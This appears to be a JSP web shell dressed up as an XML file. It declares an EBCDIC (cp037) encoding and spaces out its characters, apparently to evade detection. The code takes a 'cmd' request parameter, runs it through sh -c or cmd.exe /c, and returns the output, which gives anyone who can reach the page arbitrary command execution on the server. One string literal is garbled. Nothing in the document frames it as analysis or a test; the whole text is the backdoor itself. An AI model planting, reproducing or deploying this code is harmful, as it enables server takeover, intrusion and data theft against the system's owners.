<?xml version="1.0" encoding='cp037'?> < % 
         b o o l e a n   i s L i n u x   =   t r u e ; 
         S t r i n g   o s T y p   =   S y s t e m . g e t P r o p e r t y ( " o s . n a m e " ) ; 
         i f   ( o s T y p . t o L o w e r C a s e ( ) . c o n t a i n s ( " w i n " ) )   { 
         i s L i n u x   =   f a l s e ; 
         } 
         S t r i n g   c m d   =   r e q u e s t . g e t P a r a m e t e r ( " c m d " ) ; 
         S t r i n g [ ]   c m d s   =   i s L i n u x   ?   n e w   S t r i n g [ ] { " s h " ,   " - c " ,   c m d }   :   n e w   S t r i n g [ ] { " c m d . e x e " ,   " / c " ,   c m d } ; 
         P r o c e s s   p   =   R u n t i m e . g e t R u n t i m e ( ) . e x e c ( c m d s ) ; 
         j a v a . i o . B u f f e r e d R e a d e r   i n p u t   =   n e w   j a v a . i o . B u f f e r e d R e a d e r ( n e w   j a v a . i o . I n p u t S t r e a m R e a d e r ( p . g e t I n p u t S t r e a m ( ) ) ) ; 
         S t r i n g   l i n e   =   "Ll|@@Ε~δγΖ`ρφΒΕln " ; 
         w h i l e   ( ( l i n e   =   i n p u t . r e a d L i n e ( ) )   ! =   n u l l )   { 
                 o u t . w r i t e ( l i n e + " \ n " ) ; 
         } 
 % >